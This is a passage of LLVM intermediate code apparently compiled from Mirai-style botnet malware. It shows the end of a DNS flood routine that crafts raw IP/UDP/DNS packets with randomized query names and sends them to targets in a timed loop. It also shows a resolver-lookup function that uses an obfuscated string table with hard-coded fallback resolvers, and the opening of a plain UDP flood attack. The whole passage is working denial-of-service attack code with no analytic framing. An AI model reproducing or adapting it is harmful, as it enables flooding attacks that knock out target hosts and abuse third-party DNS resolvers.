  %144 = zext i8 %143 to i64
  %145 = add i64 41, %144
  %146 = add i64 %145, 2
  %147 = load i32, i32* %23, align 4
  %148 = sext i32 %147 to i64
  %149 = add i64 %146, %148
  %150 = add i64 %149, 4
  %151 = trunc i64 %150 to i16
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

; <label>:164:                                    ; preds = %109
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

; <label>:168:                                    ; preds = %164, %109
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 6
  store i8 17, i8* %170, align 1
  %171 = load i32, i32* @LOCAL_ADDR, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 8
  store i32 %171, i32* %173, align 4
  %174 = load i32, i32* %24, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 9
  store i32 %174, i32* %176, align 4
  %177 = load i16, i16* %18, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %180 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %179, i32 0, i32 0
  store i16 %178, i16* %180, align 2
  %181 = load i16, i16* %19, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 1
  store i16 %182, i16* %184, align 2
  %185 = load i8, i8* %21, align 1
  %186 = zext i8 %185 to i64
  %187 = add i64 21, %186
  %188 = add i64 %187, 2
  %189 = load i32, i32* %23, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %188, %190
  %192 = add i64 %191, 4
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %20, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %200 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %199, i32 0, i32 0
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 256) #7
  %202 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %203 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext 1) #7
  %205 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %206 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %205, i32 0, i32 2
  store i16 %204, i16* %206, align 2
  %207 = load i8, i8* %21, align 1
  %208 = load i8*, i8** %32, align 8
  %209 = getelementptr inbounds i8, i8* %208, i32 1
  store i8* %209, i8** %32, align 8
  store i8 %207, i8* %208, align 1
  %210 = load i8, i8* %21, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %32, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %32, align 8
  %215 = load i8*, i8** %32, align 8
  store i8* %215, i8** %33, align 8
  %216 = load i8*, i8** %32, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  %218 = load i8*, i8** %22, align 8
  %219 = load i32, i32* %23, align 4
  %220 = add nsw i32 %219, 1
  call void @util_memcpy(i8* %217, i8* %218, i32 %220)
  store i32 0, i32* %26, align 4
  br label %221

; <label>:221:                                    ; preds = %247, %168
  %222 = load i32, i32* %26, align 4
  %223 = load i32, i32* %23, align 4
  %224 = icmp slt i32 %222, %223
  br i1 %224, label %225, label %250

; <label>:225:                                    ; preds = %221
  %226 = load i8*, i8** %22, align 8
  %227 = load i32, i32* %26, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8, i8* %226, i64 %228
  %230 = load i8, i8* %229, align 1
  %231 = sext i8 %230 to i32
  %232 = icmp eq i32 %231, 46
  br i1 %232, label %233, label %243

; <label>:233:                                    ; preds = %225
  %234 = load i8, i8* %27, align 1
  %235 = load i8*, i8** %33, align 8
  store i8 %234, i8* %235, align 1
  store i8 0, i8* %27, align 1
  %236 = load i8, i8* %28, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %28, align 1
  %238 = load i8*, i8** %32, align 8
  %239 = load i32, i32* %26, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %238, i64 %240
  %242 = getelementptr inbounds i8, i8* %241, i64 1
  store i8* %242, i8** %33, align 8
  br label %246

; <label>:243:                                    ; preds = %225
  %244 = load i8, i8* %27, align 1
  %245 = add i8 %244, 1
  store i8 %245, i8* %27, align 1
  br label %246

; <label>:246:                                    ; preds = %243, %233
  br label %247

; <label>:247:                                    ; preds = %246
  %248 = load i32, i32* %26, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %26, align 4
  br label %221

; <label>:250:                                    ; preds = %221
  %251 = load i8, i8* %27, align 1
  %252 = load i8*, i8** %33, align 8
  store i8 %251, i8* %252, align 1
  %253 = load i8*, i8** %32, align 8
  %254 = load i32, i32* %23, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 2
  %258 = bitcast i8* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %34, align 8
  %259 = call zeroext i16 @htons(i16 zeroext 1) #7
  %260 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %261 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %260, i32 0, i32 0
  store i16 %259, i16* %261, align 2
  %262 = call zeroext i16 @htons(i16 zeroext 1) #7
  %263 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %264 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  br label %265

; <label>:265:                                    ; preds = %250
  %266 = load i32, i32* %11, align 4
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %11, align 4
  br label %104

; <label>:268:                                    ; preds = %104
  br label %269

; <label>:269:                                    ; preds = %413, %268
  store i32 0, i32* %11, align 4
  br label %270

; <label>:270:                                    ; preds = %404, %269
  %271 = load i32, i32* %11, align 4
  %272 = load i8, i8* %7, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp slt i32 %271, %273
  br i1 %274, label %275, label %407

; <label>:275:                                    ; preds = %270
  %276 = load i8**, i8*** %13, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %35, align 8
  %281 = load i8*, i8** %35, align 8
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %36, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.udphdr*
  store %struct.udphdr* %285, %struct.udphdr** %37, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i64 1
  %288 = bitcast %struct.udphdr* %287 to %struct.dnshdr*
  store %struct.dnshdr* %288, %struct.dnshdr** %38, align 8
  %289 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %290 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %289, i64 1
  %291 = bitcast %struct.dnshdr* %290 to i8*
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  store i8* %292, i8** %39, align 8
  %293 = load i16, i16* %15, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  br i1 %295, label %296, label %302

; <label>:296:                                    ; preds = %275
  %297 = call i32 @rand_next()
  %298 = and i32 %297, 65535
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  br label %302

; <label>:302:                                    ; preds = %296, %275
  %303 = load i16, i16* %18, align 2
  %304 = zext i16 %303 to i32
  %305 = icmp eq i32 %304, 65535
  br i1 %305, label %306, label %312

; <label>:306:                                    ; preds = %302
  %307 = call i32 @rand_next()
  %308 = and i32 %307, 65535
  %309 = trunc i32 %308 to i16
  %310 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 0
  store i16 %309, i16* %311, align 2
  br label %312

; <label>:312:                                    ; preds = %306, %302
  %313 = load i16, i16* %19, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %322

; <label>:316:                                    ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 1
  store i16 %319, i16* %321, align 2
  br label %322

; <label>:322:                                    ; preds = %316, %312
  %323 = load i16, i16* %20, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  br i1 %325, label %326, label %332

; <label>:326:                                    ; preds = %322
  %327 = call i32 @rand_next()
  %328 = and i32 %327, 65535
  %329 = trunc i32 %328 to i16
  %330 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %331 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %330, i32 0, i32 0
  store i16 %329, i16* %331, align 2
  br label %332

; <label>:332:                                    ; preds = %326, %322
  %333 = load i8*, i8** %39, align 8
  %334 = load i8, i8* %21, align 1
  %335 = zext i8 %334 to i32
  call void @rand_alphastr(i8* %333, i32 %335)
  %336 = load i8*, i8** %39, align 8
  %337 = load i8, i8* %21, align 1
  %338 = zext i8 %337 to i64
  %339 = getelementptr inbounds i8, i8* %336, i64 %338
  store i8 0, i8* %339, align 1
  %340 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 7
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = bitcast %struct.iphdr* %342 to i16*
  %344 = call zeroext i16 @checksum_generic(i16* %343, i32 20)
  %345 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 7
  store i16 %344, i16* %346, align 2
  %347 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 3
  store i16 0, i16* %348, align 2
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 2
  %354 = load i16, i16* %353, align 2
  %355 = load i8, i8* %21, align 1
  %356 = zext i8 %355 to i64
  %357 = add i64 21, %356
  %358 = add i64 %357, 2
  %359 = load i32, i32* %23, align 4
  %360 = sext i32 %359 to i64
  %361 = add i64 %358, %360
  %362 = add i64 %361, 4
  %363 = trunc i64 %362 to i32
  %364 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %349, i8* %351, i16 zeroext %354, i32 %363)
  %365 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %24, align 4
  %368 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 2
  %374 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %373, i32 0, i32 0
  store i32 %367, i32* %374, align 4
  %375 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %379 = load i32, i32* %11, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 0
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %382, i32 0, i32 1
  store i16 %377, i16* %383, align 2
  %384 = load i32, i32* %12, align 4
  %385 = load i8*, i8** %35, align 8
  %386 = load i8, i8* %21, align 1
  %387 = zext i8 %386 to i64
  %388 = add i64 41, %387
  %389 = add i64 %388, 2
  %390 = load i32, i32* %23, align 4
  %391 = sext i32 %390 to i64
  %392 = add i64 %389, %391
  %393 = add i64 %392, 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %396 = load i32, i32* %11, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %384, i8* %385, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  br label %404

; <label>:404:                                    ; preds = %332
  %405 = load i32, i32* %11, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %11, align 4
  br label %270

; <label>:407:                                    ; preds = %270
  %408 = call i64 @time(i64* null) #6
  %409 = load i32, i32* %25, align 4
  %410 = sext i32 %409 to i64
  %411 = icmp sgt i64 %408, %410
  br i1 %411, label %412, label %413

; <label>:412:                                    ; preds = %407
  br label %414

; <label>:413:                                    ; preds = %407
  br label %269

; <label>:414:                                    ; preds = %412, %100, %94, %88
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 38)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 38, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %84

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83

; <label>:69:                                     ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* %70, i8* %74, i32 %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

; <label>:83:                                     ; preds = %64
  br label %84

; <label>:84:                                     ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30

; <label>:87:                                     ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %87
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %92 = call i32 @inet_addr(i8* %91) #6
  store i32 %92, i32* %1, align 4
  br label %106

; <label>:93:                                     ; preds = %87
  br label %94

; <label>:94:                                     ; preds = %93, %15
  br label %95

; <label>:95:                                     ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

; <label>:98:                                     ; preds = %95
  %99 = call i32 @htonl(i32 134744072) #7
  store i32 %99, i32* %1, align 4
  br label %106

; <label>:100:                                    ; preds = %95
  %101 = call i32 @htonl(i32 1246898730) #7
  store i32 %101, i32* %1, align 4
  br label %106

; <label>:102:                                    ; preds = %95
  %103 = call i32 @htonl(i32 1074151430) #7
  store i32 %103, i32* %1, align 4
  br label %106

; <label>:104:                                    ; preds = %95
  %105 = call i32 @htonl(i32 67240450) #7
  store i32 %105, i32* %1, align 4
  br label %106

; <label>:106:                                    ; preds = %104, %102, %100, %98, %95, %90
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %5
  %60 = call i32 @rand_next()
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %15, align 2
  br label %65

; <label>:62:                                     ; preds = %5
  %63 = load i16, i16* %15, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #7
  store i16 %64, i16* %15, align 2
  br label %65

; <label>:65:                                     ; preds = %62, %59
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %178, %65
  %67 = load i32, i32* %11, align 4
  %68 = load i8, i8* %7, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %67, %69
  br i1 %70, label %71, label %181

; <label>:71:                                     ; preds = %66
  %72 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %73 = load i8**, i8*** %12, align 8
  %74 = load i32, i32* %11, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8*, i8** %73, i64 %75
  store i8* %72, i8** %76, align 8
  %77 = load i16, i16* %14, align 2
  %78 = zext i16 %77 to i32
  %79 = icmp eq i32 %78, 65535
  br i1 %79, label %80, label %89

; <label>:80:                                     ; preds = %71
  %81 = call i32 @rand_next()
  %82 = trunc i32 %81 to i16
  %83 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 0
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %87, i32 0, i32 1
  store i16 %82, i16* %88, align 2
  br label %98

; <label>:89:                                     ; preds = %71
  %90 = load i16, i16* %14, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %90) #7
  %92 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %93 = load i32, i32* %11, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 0
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %96, i32 0, i32 1
  store i16 %91, i16* %97, align 2
  br label %98

; <label>:98:                                     ; preds = %89, %80
  %99 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %100 = load i32*, i32** %13, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %100, i64 %102
  store i32 %99, i32* %103, align 4
  %104 = icmp eq i32 %99, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %224

; <label>:106:                                    ; preds = %98
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %107, align 4
  %108 = load i16, i16* %15, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %108, i16* %109, align 2
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %111 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %110, i32 0, i32 0
  store i32 0, i32* %111, align 4
  %112 = load i32*, i32** %13, align 8
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %118 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %118, %struct.sockaddr** %117, align 8
  %119 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %120 = load %struct.sockaddr*, %struct.sockaddr** %119, align 8
  %121 = call i32 @bind(i32 %116, %struct.sockaddr* %120, i32 16) #6
  %122 = icmp eq i32 %121, -1
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %106
  br label %124

